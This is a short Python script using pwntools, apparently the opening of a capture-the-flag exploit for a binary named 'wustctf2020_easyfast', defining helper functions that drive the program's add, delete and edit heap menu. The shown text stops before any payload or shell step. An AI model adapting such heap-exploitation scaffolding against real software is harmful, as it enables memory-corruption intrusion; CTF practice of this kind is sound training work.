from pwn import *
from LibcSearcher import *
context.log_level = "debug"
io=process('./wustctf2020_easyfast')
def add(size):
   io.sendlineafter('choice>\n',b'1')
   io.sendlineafter('size>\n',str(size))
def dele(num):
   io.sendlineafter('choice>\n',b'2')
   io.sendlineafter('index>\n',str(num))
def edit(num,idx):
   io.sendlineafter('choice>\n',b'3')
   io.sendlineafter('index>\n',str(num))
   io.sendline(str(idx))